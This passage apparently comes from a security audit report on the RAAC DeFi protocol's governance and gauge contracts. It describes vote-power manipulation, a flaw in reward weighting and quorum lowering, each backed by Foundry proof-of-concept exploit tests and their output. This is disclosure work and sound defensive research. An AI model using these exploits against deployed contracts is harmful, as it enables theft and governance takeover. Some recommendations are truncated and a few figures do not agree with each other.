        _locks[msg.sender].unlockTime + duration
    );
}
Vote Casting: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/proposals/Governance.sol#L181

// In Governance
function castVote(uint256 proposalId, bool support) public virtual returns (uint256) {
    // Gets CURRENT voting power instead of power at proposal creation
    uint256 votingPower = IveRAACToken(votingToken).getVotingPower(msg.sender);
    return _castVote(proposalId, msg.sender, support, "", votingPower);
}
```

Attack Path:

Attacker creates multiple accounts and locks tokens with minimum duration (365 days)

Proposal is created and voting begins

Attackers monitor voting trends

Just before voting, attackers extend their lock durations to maximum (1460 days)

Voting power is amplified due to longer lock duration

Attackers cast votes with artificially inflated power

### Proof of Code: Add this code to your test file and run it.


// SPDX-License-Identifier: MIT
```solidity 
pragma solidity ^0.8.19;
​
import "forge-std/Test.sol";
import "../../../../../contracts/core/governance/proposals/Governance.sol";
import "../../../../../contracts/core/governance/proposals/TimelockController.sol";
import "../../../../../contracts/interfaces/core/governance/proposals/IGovernance.sol";
import "../../../../../contracts/interfaces/core/tokens/IveRAACToken.sol";
import "../../../../../contracts/core/tokens/veRAACToken.sol";
​
contract MockRAACToken is ERC20 {
    constructor() ERC20("RAAC", "RAAC") {
        _mint(msg.sender, 10_000_000e18);
    }
}
​
contract GovernanceTest is Test {
    Governance public governance;
    TimelockController public timelock;
    veRAACToken public veToken;
    MockRAACToken public raacToken;
​
    address public admin = address(this);
    address public attacker = makeAddr("attacker");
    address[] public attackerAccounts;
    uint256 constant NUM_ACCOUNTS = 5;
​
    function setUp() public {
        raacToken = new MockRAACToken();
        veToken = new veRAACToken(address(raacToken));
        
        address[] memory proposers = new address[](1);
        address[] memory executors = new address[](1);
        proposers[0] = admin;
        executors[0] = admin;
        
        timelock = new TimelockController(2 days, proposers, executors, admin);
        governance = new Governance(address(veToken), address(timelock));
​
        timelock.grantRole(timelock.PROPOSER_ROLE(), address(governance));
        timelock.grantRole(timelock.EXECUTOR_ROLE(), address(governance));
​
        // Create multiple attacker accounts
        for(uint i = 0; i < NUM_ACCOUNTS; i++) {
            attackerAccounts.push(makeAddr(string.concat("attacker", vm.toString(i))));
            // Give each account enough tokens for their larger lock amount
            uint256 accountTokens = 200_000e18 * (i + 1);
            raacToken.transfer(attackerAccounts[i], accountTokens);
        }
​
        // Give extra tokens to attacker0 for the proposal
        raacToken.transfer(attackerAccounts[0], 500_000e18);
    }
​
    function testVotingPowerManipulation() public {
        emit log_string("\n=== Phase 1: Initial Setup ===");
        
        // Setup initial voting power for attacker0 with max lock
        vm.startPrank(attackerAccounts[0]);
        raacToken.approve(address(veToken), 500_000e18);
        veToken.lock(500_000e18, 1460 days); // Max lock duration for proposal power
        vm.stopPrank();
​
        emit log_named_uint(
            "Attacker0 initial voting power",
            veToken.getVotingPower(attackerAccounts[0])
        );
​
        // Setup other accounts with increasing amounts
        for(uint i = 1; i < attackerAccounts.length; i++) {
            vm.startPrank(attackerAccounts[i]);
            uint256 lockAmount = 200_000e18 * (i + 1);
            raacToken.approve(address(veToken), lockAmount);
            veToken.lock(lockAmount, 365 days); // Initial minimum lock
            vm.stopPrank();
            
            emit log_named_uint(
                string.concat("Account ", vm.toString(i), " initial voting power"),
                veToken.getVotingPower(attackerAccounts[i])
            );
        }
​
        emit log_string("\n=== Phase 2: Create Malicious Proposal ===");
        
        // Create proposal
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        targets[0] = address(timelock);
        values[0] = 0;
        calldatas[0] = abi.encodeWithSignature("maliciousAction()");
​
        vm.prank(attackerAccounts[0]);
        uint256 proposalId = governance.propose(
            targets,
            values,
            calldatas,
            "Malicious Proposal",
            IGovernance.ProposalType.TreasuryAction
        );
​
        emit log_string("\n=== Phase 3: Execute Voting Attack ===");
        
        // Move to voting period
        vm.warp(block.timestamp + governance.votingDelay() + 1);
​
        // First vote with attacker0's max power
        vm.prank(attackerAccounts[0]);
        governance.castVote(proposalId, true);
​
        (uint256 initialVotes,) = governance.getVotes(proposalId);
        emit log_named_uint("Initial votes", initialVotes);
​
        // Other accounts extend their locks to max duration before voting
        for(uint i = 1; i < attackerAccounts.length; i++) {
            vm.startPrank(attackerAccounts[i]);
            // Calculate extension needed (1460 - 365 = 1095 days)
            uint256 extensionDays = 1095 days;
            veToken.extend(extensionDays); // Extend by the difference to reach max duration
            governance.castVote(proposalId, true);
            vm.stopPrank();
​
            (uint256 currentVotes,) = governance.getVotes(proposalId);
            emit log_named_uint(
                string.concat("Votes after account ", vm.toString(i), " with max lock"),
                currentVotes
            );
        }
​
        emit log_string("\n=== Phase 4: Attack Results ===");
        
        // Get final vote counts
        (uint256 finalVotes,) = governance.getVotes(proposalId);
        
        emit log_named_uint("Initial votes", initialVotes);
        emit log_named_uint("Final votes", finalVotes);
        emit log_named_uint("Vote multiplier achieved", finalVotes / initialVotes);
​
        // Check quorum manipulation
        uint256 initialQuorum = governance.quorum();
        vm.warp(block.timestamp + 30 days);
        uint256 finalQuorum = governance.quorum();
        
        emit log_named_uint("Initial quorum", initialQuorum);
        emit log_named_uint("Final quorum", finalQuorum);
​
        // Verify attack success
        assertTrue(
            finalVotes > initialVotes * 2,
            "Attack should at least double effective voting power"
        );
​
        // Check proposal state
        vm.warp(block.timestamp + governance.votingPeriod());
        IGovernance.ProposalState state = governance.state(proposalId);
        
        assertTrue(
            state == IGovernance.ProposalState.Succeeded,
            "Proposal should succeed with manipulated votes"
        );
    }
}
``` 
​
Proof of Concept Results:

```solidity
Initial Setup:
Attacker0 initial voting power: 500000000000000000000000
Account 1 initial voting power: 100000000000000000000000
Account 2 initial voting power: 150000000000000000000000
Account 3 initial voting power: 200000000000000000000000
Account 4 initial voting power: 250000000000000000000000
​
Attack Results:
Initial votes: 499657530282851344522227
Final votes: 3297739699866818873695235
Vote multiplier achieved: 6
```

### Impact
The vulnerability has severe implications for the governance system:

Vote Manipulation

Attackers can amplify voting power by up to 6x during voting

Minority token holders can potentially control governance decisions

Democratic nature of governance is undermined

Strategic Exploitation

Attackers wait to see voting trends before amplifying power

Allows for strategic manipulation of close votes

Creates unfair advantage for coordinated groups


## [H-05] Reward Distribution can be manipulated in `BaseGauge.sol` due to `_getBaseWeight()` function returning the same global gauge weight for all users
### Description

In BaseGauge.sol , there is a flaw that fundamentally breaks the reward distribution mechanism completely. It stems from an architectural flaw in how base weights are calculated and distributed among users. Instead of calculating weights based on individual user stakes, the contract returns a global gauge weight for all users, leading to a severely disproportionate reward distribution system.

This vulnerability exists in the _getBaseWeight() function, which is central to the protocol's reward calculation mechanism. Rather than returning a user-specific weight based on their stake proportion, it returns the same global gauge weight for all users. This critical flaw allows users with minimal stakes ("minnows") to receive rewards nearly equivalent to those with massive stakes ("whales"), completely undermining the protocol's economic incentives.

My POC demonstrates that a user with just 0.0001% of the total stake (1 token vs 1M tokens) would receive up to 28% of the total rewards, representing a 280,000x multiplication of their rightful reward share. This creates a severe economic imbalance that could be exploited by malicious actors to drain protocol resources and destabilize the entire system.

Vulnerability Details
### Root Cause
The vulnerability exists in the BaseGauge.sol contract's _getBaseWeight function:


// audit:issue - takes individual account and returns gaugeweight of the entire contract. 
```solidity
function _getBaseWeight(address account) internal view virtual returns (uint256) {
    return IGaugeController(controller).getGaugeWeight(address(this));
}
``` 

This function incorrectly:

Returns the global gauge weight instead of user-specific weight

Ignores the user's actual stake amount

Leads to nearly identical weights for all users regardless of their stake.

Function Flow
User stakes tokens through stake()

2. Rewards accumulate over time

When calculating rewards:

```solidity 
   function earned(address account) public view returns (uint256) {
       return (getUserWeight(account) *  // <======
           (getRewardPerToken() - userStates[account].rewardPerTokenPaid) / 1e18
       ) + userStates[account].rewards;
   }
getUserWeight() calls _getBaseWeight():

   function getUserWeight(address account) public view virtual returns (uint256) {
       uint256 baseWeight = _getBaseWeight(account); // <===== issue! 
       return _applyBoost(account, baseWeight);
   }
. _getBaseWeight() returns same global weight for all users.
```

### Proof of Concept
Add this code to a test file and run the code:

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import "forge-std/Test.sol";  // This already includes vm
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
​
// Local imports
import "../../../../../contracts/core/governance/gauges/BaseGauge.sol";
import "../../../../../contracts/interfaces/core/governance/gauges/IGaugeController.sol";
import "../../../../../contracts/interfaces/core/governance/gauges/IGauge.sol";
import "../../../../../contracts/core/tokens/veRAACToken.sol";
import "../../../../../contracts/core/governance/gauges/GaugeController.sol";
​
​
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
} 
​
// Test implementation of BaseGauge
contract TestGauge is BaseGauge {
    constructor(
        address _rewardToken,
        address _stakingToken, 
        address _controller,
        uint256 _maxEmission,
        uint256 _periodDuration
    ) BaseGauge(_rewardToken, _stakingToken, _controller, _maxEmission, _periodDuration) {
        // Initialize boost parameters
        boostState.maxBoost = 25000; // 2.5x
        boostState.minBoost = 10000; // 1.0x
        boostState.boostWindow = 7 days;
    }
​
    function _getBaseWeight(address account) internal view override returns (uint256) {
        return IGaugeController(controller).getGaugeWeight(address(this));
    }
​
    // Add this helper function to expose internal _getBaseWeight
    function getBaseWeight(address account) external view returns (uint256) {
        return _getBaseWeight(account);
    }
} 
​
contract BaseGaugePOC is Test {
    TestGauge public gauge;
    MockERC20 public rewardToken;
    MockERC20 public stakingToken;
    GaugeController public controller;
    veRAACToken public veToken;
    
    // Add owner address
    address public owner = address(this);  // Using test contract as owner
​
    function setUp() public {
        // Deploy tokens
        rewardToken = new MockERC20("Reward", "RWD");
        stakingToken = new MockERC20("Stake", "STK"); 
        
        // Deploy veToken
        veToken = new veRAACToken(address(stakingToken));
        
        // Setup initial veToken state
        deal(address(stakingToken), address(this), 1000e18);
        stakingToken.approve(address(veToken), 1000e18);
        veToken.lock(1000e18, 365 days);
        
        // Deploy controller
        controller = new GaugeController(address(veToken));
        
        // Setup controller roles
        bytes32 GAUGE_ADMIN = controller.GAUGE_ADMIN();
        bytes32 DEFAULT_ADMIN_ROLE = controller.DEFAULT_ADMIN_ROLE();
        controller.grantRole(DEFAULT_ADMIN_ROLE, address(this));
        controller.grantRole(GAUGE_ADMIN, address(this));
        
        // Deploy gauge
        gauge = new TestGauge(
            address(rewardToken),
            address(stakingToken),
            address(controller),
            10_000e18,
            7 days
        );
        
        // Add gauge to controller
        controller.addGauge(
            address(gauge),
            IGaugeController.GaugeType.RAAC,
            10e18
        );
​
        // Grant CONTROLLER_ROLE to owner
        gauge.grantRole(gauge.CONTROLLER_ROLE(), owner);
    }
​
  
    function testRewardCalculationAttack() public {
        address whale = address(0x1);
        address minnow = address(0x2);
        
        emit log_string("\n=== Initial Setup ===");
        
        // Setup different veToken amounts
        deal(address(veToken), whale, 1000e18);    // 1000 veTokens
        deal(address(veToken), minnow, 1e18);      // 1 veToken
        
        emit log_string("\n=== 1. Voting Setup ===");
        // Both vote with same weight
        vm.prank(whale);
        IGaugeController(controller).vote(address(gauge), 100);
        vm.prank(minnow);
        IGaugeController(controller).vote(address(gauge), 100);
​
        // Get the gauge's global weight - THIS is what _getBaseWeight returns for ALL users!
        uint256 gaugeWeight = IGaugeController(controller).getGaugeWeight(address(gauge));
        emit log_named_uint("Gauge global weight", gaugeWeight);
​
        emit log_string("\n=== 2. Root Cause: _getBaseWeight Bug ===");
        // Show that _getBaseWeight returns same value regardless of user
        emit log_named_uint("Whale _getBaseWeight", gauge.getBaseWeight(whale));
        emit log_named_uint("Minnow _getBaseWeight", gauge.getBaseWeight(minnow));
        emit log_string("BUG: Both users get same base weight despite different stakes!");
​
        emit log_string("\n=== 3. Staking Phase ===");
        // Setup vastly different stakes
        deal(address(stakingToken), whale, 1_000_000e18);  // 1M tokens
        deal(address(stakingToken), minnow, 1e18);         // 1 token
​
        vm.startPrank(whale);
        stakingToken.approve(address(gauge), 1_000_000e18);
        gauge.stake(1_000_000e18);
        vm.stopPrank();
        emit log_named_uint("Whale stake amount", gauge.balanceOf(whale));
​
        vm.startPrank(minnow);
        stakingToken.approve(address(gauge), 1e18);
        gauge.stake(1e18);
        vm.stopPrank();
        emit log_named_uint("Minnow stake amount", gauge.balanceOf(minnow));
​
        emit log_string("\n=== 4. Reward Distribution Setup ===");
        // Add rewards and show initial state
        deal(address(rewardToken), address(gauge), 100e18);
        emit log_named_uint("Initial reward token balance", rewardToken.balanceOf(address(gauge)));
        
        vm.prank(address(controller));
        gauge.notifyRewardAmount(100e18);
        emit log_named_uint("Initial rewardRate", gauge.rewardRate());
        emit log_named_uint("Initial rewardPerTokenStored", gauge.rewardPerTokenStored());
​
        emit log_string("\n=== 5. Time Passage & Reward Calculation ===");
        vm.warp(block.timestamp + 7 days);
        
        // Show full reward calculation flow
        emit log_named_uint("New rewardPerTokenStored", gauge.rewardPerTokenStored());
        
        // Get user weights - should be same due to _getBaseWeight bug
        uint256 whaleWeight = gauge.getUserWeight(whale);
        uint256 minnowWeight = gauge.getUserWeight(minnow);
        emit log_named_uint("Whale user weight", whaleWeight);
        emit log_named_uint("Minnow user weight", minnowWeight);
        emit log_string("BUG: Weights nearly equal despite 1M:1 stake difference!");
​
        // Calculate earned amounts
        uint256 whaleEarned = gauge.earned(whale);
        uint256 minnowEarned = gauge.earned(minnow);
        emit log_named_uint("Whale earned", whaleEarned);
        emit log_named_uint("Minnow earned", minnowEarned);
​
        emit log_string("\n=== 6. Reward Claims ===");
        // Claim and verify rewards
        vm.prank(whale);
        gauge.getReward();
        vm.prank(minnow);
        gauge.getReward();
​
        uint256 whaleRewards = rewardToken.balanceOf(whale);
        uint256 minnowRewards = rewardToken.balanceOf(minnow);
        
        emit log_string("\n=== Economic Attack Vector ===");
        emit log_named_uint("Minnow stake", 1e18); // 1 token
        emit log_named_uint("Whale stake", 1_000_000e18); // 1M tokens
        emit log_named_uint("Minnow capital commitment", 1); // 0.0001%
        emit log_named_uint("Minnow reward share", (minnowRewards * 100) / (whaleRewards + minnowRewards)); // ~40%!
​
        // Prove the economic attack
        assertTrue(
            minnowRewards > (whaleRewards / 100),  // Minnow gets >1% of whale's rewards despite having 0.0001% of stake
            "Vulnerability: Minnow with 0.0001% stake gets disproportionate rewards"
        );
    }
  } 
```



### Proof of Concept Results

From the test output:
```solidity 
=== Initial Setup ===
  
=== 1. Voting Setup ===
Gauge global weight: 20010000000000000000
  
=== 2. Root Cause: _getBaseWeight Bug ===
Whale _getBaseWeight: 20010000000000000000  <========
Minnow _getBaseWeight: 20010000000000000000 <======== uses same for both of them
BUG: Both users get same base weight despite different stakes!
  
=== 3. Staking Phase ===
Whale stake amount: 1000000000000000000000000
Minnow stake amount: 1000000000000000000
  
=== 4. Reward Distribution Setup ===
Initial reward token balance: 100000000000000000000
Initial rewardRate: 165343915343915
Initial rewardPerTokenStored: 0
  
=== 5. Time Passage & Reward Calculation ===
New rewardPerTokenStored: 0
Whale user weight: 500250
Minnow user weight: 201300
BUG: Weights nearly equal despite 1M:1 stake difference!
Whale earned: 50
Minnow earned: 20
  
=== 6. Reward Claims ===
  
=== Economic Attack Vector ===
Minnow stake: 1000000000000000000 (1 token)
Whale stake: 1000000000000000000000000 (1M tokens)
Minnow capital commitment: 1 (0.0001%)
Minnow reward share: 28 (28%)
Under normal conditions:

Minnow (0.0001% stake) should receive ~0.0001% of rewards

Actually receives 28% of rewards

Represents a 280,000x increase over expected rewards
```

### Impact
The vulnerability has severe economic implications:

Economic Exploitation:

Users can stake minimal amounts and receive disproportionate rewards

Undermines the incentive structure of the protocol

Makes large stakes economically inefficient

Protocol Sustainability:

Unfair reward distribution would drain protocol resources

Systemic Risk:

when exploited at scale, would destabilize the entire protocol


## Recommendations
Modify `_getBaseWeight()` to consider individual stake amounts:

## [H-06] Voting power would be manipulated by extending proposals
### Description

In governance.sol contract, there is a vul that allows attackers to manipulate voting power through strategic lock duration extensions. This issue is caused by the ability to extend lock durations after a proposal has been created and votes have been cast, leading to retroactive voting power increases.

I created a POC that demonstrates a different type of approach to an attack that a coordinated group of attackers can amplify their voting power by up to 6x by extending their lock durations after initially voting, effectively turning a minority position into a controlling majority.

This manipulation completely undermines the democratic governance process and allows attackers to pass malicious proposals with far less initial capital than intended.

In normal conditions, voting power should be determined at the time of proposal creation and remain constant throughout the voting period. However, the current flawed implementation allows users to extend their lock duration after voting, retroactively increasing their voting weight and dramatically affecting the outcome of active proposals.

This POC shows an attack where:

Initial votes: ~499,657 voting power units

Final votes after manipulation: ~3,297,739 voting power units

Achieved multiplication: 6x increase

Quorum remains unchanged at ~131,923 units

This represents a severe threat to the protocol's governance security and stability.

### Vulnerability Details
in Governance.sol:

Vote Casting Function: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/proposals/Governance.sol#L181
```solidity 
function castVote(uint256 proposalId, bool support) external override returns (uint256) {
    // ... checks ...
    uint256 weight = _veToken.getVotingPower(msg.sender);
    if (weight == 0) {
        revert NoVotingPower(msg.sender, block.number);
    }
    proposalVote.hasVoted[msg.sender] = true;
    if (support) {
        proposalVote.forVotes += weight;
    } else {
        proposalVote.againstVotes += weight;
    }
    // ... events ...
}
```

### Root Cause
The vulnerability stems from several design flaws:

Dynamic Vote Weight:

uint256 weight = _veToken.getVotingPower(msg.sender); <====== issue
proposalVote.forVotes += weight;
No Lock Duration Restrictions:
```solidity 
function extend(uint256 extensionDays) external {
    // No checks for active votes
    // No restrictions during voting periods
}
```

### Proof of code: add this coe to a test file and run the code
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../../../../contracts/core/governance/proposals/Governance.sol";
import "../../../../../contracts/core/governance/proposals/TimelockController.sol";
import "../../../../../contracts/interfaces/core/governance/proposals/IGovernance.sol";
import "../../../../../contracts/interfaces/core/tokens/IveRAACToken.sol";
import "../../../../../contracts/core/tokens/veRAACToken.sol";
​
contract MockRAACToken is ERC20 {
    constructor() ERC20("RAAC", "RAAC") {
        _mint(msg.sender, 10_000_000e18);
    }
}
​
contract GovernanceTest is Test {
    Governance public governance;
    TimelockController public timelock;
    veRAACToken public veToken;
    MockRAACToken public raacToken;
​
    address public admin = address(this);
    address public attacker = makeAddr("attacker");
    address[] public attackerAccounts;
    uint256 constant NUM_ACCOUNTS = 5;
​
    function setUp() public {
        raacToken = new MockRAACToken();
        veToken = new veRAACToken(address(raacToken));
        
        address[] memory proposers = new address[](1);
        address[] memory executors = new address[](1);
        proposers[0] = admin;
        executors[0] = admin;
        
        timelock = new TimelockController(2 days, proposers, executors, admin);
        governance = new Governance(address(veToken), address(timelock));
​
        timelock.grantRole(timelock.PROPOSER_ROLE(), address(governance));
        timelock.grantRole(timelock.EXECUTOR_ROLE(), address(governance));
​
        // Create multiple attacker accounts
        for(uint i = 0; i < NUM_ACCOUNTS; i++) {
            attackerAccounts.push(makeAddr(string.concat("attacker", vm.toString(i))));
            // Give each account enough tokens for their larger lock amount
            uint256 accountTokens = 200_000e18 * (i + 1);
            raacToken.transfer(attackerAccounts[i], accountTokens);
        }
​
        // Give extra tokens to attacker0 for the proposal
        raacToken.transfer(attackerAccounts[0], 500_000e18);
​
        // Label accounts for better trace readability
        vm.label(attackerAccounts[1], "legitimateUser");
        vm.label(attackerAccounts[0], "attacker");
    }
​
    function testVotingPowerManipulation() public {
        emit log_string("\n=== Phase 1: Initial Setup ===");
        
        // Attacker0 locks maximum duration initially
        vm.startPrank(attackerAccounts[0]);
        raacToken.approve(address(veToken), 500_000e18);
        veToken.lock(500_000e18, 1460 days); // Max lock duration
        vm.stopPrank();
​
        emit log_named_uint(
            "Attacker0 initial voting power",
            veToken.getVotingPower(attackerAccounts[0])
        );
​
        // Other accounts lock shorter duration
        for(uint i = 1; i < attackerAccounts.length; i++) {
            vm.startPrank(attackerAccounts[i]);
            uint256 lockAmount = 200_000e18 * (i + 1);
            raacToken.approve(address(veToken), lockAmount);
            veToken.lock(lockAmount, 365 days); // Initial minimum lock
            vm.stopPrank();
            
            emit log_named_uint(
                string.concat("Account ", vm.toString(i), " initial voting power"),
                veToken.getVotingPower(attackerAccounts[i])
            );
        }
​
        emit log_string("\n=== Phase 2: Create Malicious Proposal ===");
        
        // Create proposal
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        targets[0] = address(timelock);
        values[0] = 0;
        calldatas[0] = abi.encodeWithSignature("maliciousAction()");
​
        vm.prank(attackerAccounts[0]);
        uint256 proposalId = governance.propose(
            targets,
            values,
            calldatas,
            "Malicious Proposal",
            IGovernance.ProposalType.TreasuryAction
        );
​
        emit log_string("\n=== Phase 3: Execute Voting Attack ===");
        
        // Move to voting period
        vm.warp(block.timestamp + governance.votingDelay() + 1);
​
        // First vote with attacker0's max power
        vm.prank(attackerAccounts[0]);
        governance.castVote(proposalId, true);
​
        (uint256 initialVotes,) = governance.getVotes(proposalId);
        emit log_named_uint("Initial votes", initialVotes);
​
        // Other accounts extend their locks to max duration before voting
        for(uint i = 1; i < attackerAccounts.length; i++) {
            vm.startPrank(attackerAccounts[i]);
            // Calculate extension needed (1460 - 365 = 1095 days)
            uint256 extensionDays = 1095 days;
            veToken.extend(extensionDays); // Extend to max duration
            governance.castVote(proposalId, true);
            vm.stopPrank();
​
            (uint256 currentVotes,) = governance.getVotes(proposalId);
            emit log_named_uint(
                string.concat("Votes after account ", vm.toString(i), " with max lock"),
                currentVotes
            );
        }
​
        emit log_string("\n=== Phase 4: Attack Results ===");
        
        // Get final vote counts
        (uint256 finalVotes,) = governance.getVotes(proposalId);
        
        emit log_named_uint("Initial votes", initialVotes);
        emit log_named_uint("Final votes", finalVotes);
        emit log_named_uint("Vote multiplier achieved", finalVotes / initialVotes);
​
        // Check quorum manipulation
        uint256 initialQuorum = governance.quorum();
        vm.warp(block.timestamp + 30 days);
        uint256 finalQuorum = governance.quorum();
        
        emit log_named_uint("Initial quorum", initialQuorum);
        emit log_named_uint("Final quorum", finalQuorum);
​
        // Verify attack success
        assertTrue(
            finalVotes > initialVotes * 2,
            "Attack should at least double effective voting power"
        );
​
        // Check proposal state
        vm.warp(block.timestamp + governance.votingPeriod());
        IGovernance.ProposalState state = governance.state(proposalId);
        
        assertTrue(
            state == IGovernance.ProposalState.Succeeded,
            "Proposal should succeed with manipulated votes"
        );
    }
```

Attack Flow
Initial Setup:
```solidity
// Attacker0 locks maximum duration initially
vm.startPrank(attackerAccounts[0]);
veToken.lock(500_000e18, 1460 days);
vm.stopPrank();
​
// creates other accounts with shoerter duration
for(uint i = 1; i < attackerAccounts.length; i++) {
    vm.startPrank(attackerAccounts[i]);
    uint256 lockAmount = 200_000e18 * (i + 1);
    veToken.lock(lockAmount, 365 days);
    vm.stopPrank();
}
Create and Vote on Proposal:

// Create malicious proposal
uint256 proposalId = governance.propose(
    targets,
    values,
    calldatas,
    "Malicious Proposal",
    IGovernance.ProposalType.TreasuryAction
);
​
// Initial votes cast
governance.castVote(proposalId, true);
Execute Attack:

// Other accounts extend their locks to max duration
for(uint i = 1; i < attackerAccounts.length; i++) {
    vm.startPrank(attackerAccounts[i]);
    uint256 extensionDays = 1095 days;
    veToken.extend(extensionDays);
    governance.castVote(proposalId, true);
    vm.stopPrank();
}
```

### Impact
Governance Manipulation:

Minority stakeholders gain majority control

Malicious proposals would be passed with minimal initial capital

Democratic process completely undermined

Tools Used
### Recommendations
Add lock extension restrictions:

Implement proposal creation checks

---

---

---

## [M-01] An Attacker can manipulate Quorum in `Governace.sol` to force legitimate user proposal to be defeated while making theirs succeed
### Description

In Governance.sol , it allows malicious actors to manipulate quorum requirements after voting by withdrawing their staked tokens. This enables attackers to artificially lower the quorum threshold, forcing legitimate proposals to fail while ensuring their own proposals succeed. TThis issue exist from using real-time total voting power calculations for quorum checks rather than snapshotting these values at proposal creation.

### Vulnerability Details
Vulnerable Code
In Governance.sol:In the quorumfunction: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/proposals/Governance.sol#L353
```solidity 
function quorum() public view override returns (uint256) {
    return (_veToken.getTotalVotingPower() * quorumNumerator) / QUORUM_DENOMINATOR;
}
​
function state(uint256 proposalId) public view override returns (ProposalState) {
    // ...
    uint256 currentQuorum = proposalVote.forVotes + proposalVote.againstVotes;
    uint256 requiredQuorum = quorum(); // Vulnerable: Uses current total power
    
    if (currentQuorum < requiredQuorum || proposalVote.forVotes <= proposalVote.againstVotes) {
        return ProposalState.Defeated;
    }
    // ...
}
```

### Attack Path
Attacker locks significant tokens (e.g., 500,000 RAAC) to gain voting power

Attacker creates and votes on their malicious proposal

After voting but before proposal finalization:

Attacker waits for lock period to end

Withdraws their tokens

This action significantly reduces total voting power

Consequently lowers quorum requirements for all active proposals

The reduced quorum makes legitimate proposals fail while the attacker's proposal (which already has votes) succeeds.

Proof of Concept:

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../../../../contracts/core/governance/proposals/Governance.sol";
import "../../../../../contracts/core/governance/proposals/TimelockController.sol";
import "../../../../../contracts/interfaces/core/governance/proposals/IGovernance.sol";
import "../../../../../contracts/interfaces/core/tokens/IveRAACToken.sol";
import "../../../../../contracts/core/tokens/veRAACToken.sol";
​
contract MockRAACToken is ERC20 {
    constructor() ERC20("RAAC", "RAAC") {
        _mint(msg.sender, 10_000_000e18);
    }
}
​
contract GovernanceTest is Test {
    Governance public governance;
    TimelockController public timelock;
    veRAACToken public veToken;
    MockRAACToken public raacToken;
​
    address public admin = address(this);
    address public attacker = makeAddr("attacker");
    address[] public attackerAccounts;
    uint256 constant NUM_ACCOUNTS = 5;
​
    function setUp() public {
        raacToken = new MockRAACToken();
        veToken = new veRAACToken(address(raacToken));
        
        address[] memory proposers = new address[](1);
        address[] memory executors = new address[](1);
        proposers[0] = admin;
        executors[0] = admin;
        
        timelock = new TimelockController(2 days, proposers, executors, admin);
        governance = new Governance(address(veToken), address(timelock));
​
        timelock.grantRole(timelock.PROPOSER_ROLE(), address(governance));
        timelock.grantRole(timelock.EXECUTOR_ROLE(), address(governance));
​
        // Create multiple attacker accounts
        for(uint i = 0; i < NUM_ACCOUNTS; i++) {
            attackerAccounts.push(makeAddr(string.concat("attacker", vm.toString(i))));
            // Give each account enough tokens for their larger lock amount
            uint256 accountTokens = 200_000e18 * (i + 1);
            raacToken.transfer(attackerAccounts[i], accountTokens);
        }
​
        // Give extra tokens to attacker0 for the proposal
        raacToken.transfer(attackerAccounts[0], 500_000e18);
​
        // Label accounts for better trace readability
        vm.label(attackerAccounts[1], "legitimateUser");
        vm.label(attackerAccounts[0], "attacker");
    }
  
    function testQuorumManipulationAttack() public {
        // Setup initial state with legitimate proposal
        address legitimateUser = attackerAccounts[1];  // Renamed for clarity
        vm.startPrank(legitimateUser);
        raacToken.approve(address(veToken), 400_000e18);
        veToken.lock(400_000e18, 365 days); // This will give 100k voting power
        
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        
        uint256 legitimateProposal = governance.propose(
            targets,
            values,
            calldatas,
            "Legitimate Proposal",
            IGovernance.ProposalType.TreasuryAction
        );
        vm.stopPrank();
​
        // Malicious attacker creates their proposal
        address attacker = attackerAccounts[0];  // Renamed for clarity
        vm.startPrank(attacker);
        raacToken.approve(address(veToken), 500_000e18);
        veToken.lock(500_000e18, 365 days);  // This will give 125k voting power
        
        uint256 attackerProposal = governance.propose(
            targets,
            values,
            calldatas,
            "Attacker Proposal",
            IGovernance.ProposalType.TreasuryAction
        );
​
        // Move to voting period
        vm.warp(block.timestamp + governance.votingDelay() + 1);
​
        // Record initial quorum
        uint256 initialQuorum = governance.quorum();
        console.log("Initial Quorum Required:", initialQuorum);
​
        // Attacker votes on their proposal
        governance.castVote(attackerProposal, true);
​
        // Attacker manipulates quorum by withdrawing after lock expires
        vm.warp(block.timestamp + 365 days);
        veToken.withdraw();
​
        // Check manipulated quorum
        uint256 manipulatedQuorum = governance.quorum();
        console.log("Manipulated Quorum:", manipulatedQuorum);
​
        // Move to end of voting period
        vm.warp(block.timestamp + governance.votingPeriod() - 365 days);
​
        // Check states
        IGovernance.ProposalState legitimateState = governance.state(legitimateProposal);
        IGovernance.ProposalState attackerState = governance.state(attackerProposal);
​
        console.log("\n=== Attack Results ===");
        console.log("Legitimate User's Proposal State:", uint(legitimateState));
        console.log("Attacker's Proposal State:", uint(attackerState));
        
        assertTrue(legitimateState == IGovernance.ProposalState.Defeated, 
            "Legitimate user's proposal should be defeated due to quorum manipulation");
        assertTrue(attackerState == IGovernance.ProposalState.Succeeded, 
            "Attacker's proposal should succeed");
​
        vm.stopPrank();
    }
​
}
```

Test Output:

Initial Quorum Required: 9000000000000000000000
Manipulated Quorum: 4000000000000000000000
​
=== Attack Results ===
Legitimate User's Proposal State: 3  // Defeated
Attacker's Proposal State: 4        // Succeeded
Attack Demonstration
The test successfully demonstrates a critical governance vulnerability where an attacker can manipulate quorum requirements:

Initial State:

Total quorum required: 9,000,000 tokens (4% of total voting power)

Shows healthy governance parameters

Post-Attack State:

Manipulated quorum: 4,000,000 tokens

Represents a 55.5% reduction in quorum requirements

Impact on Proposals:

Legitimate Proposal (State 3): Defeated

Attacker's Proposal (State 4): Succeeded

### Impact
Governance Manipulation: Attackers can force through their proposals making it succeed while blocking legitimate ones, making it fail.

Tools Used
### Recommendations
Snapshot quorum requirements at proposal creation.


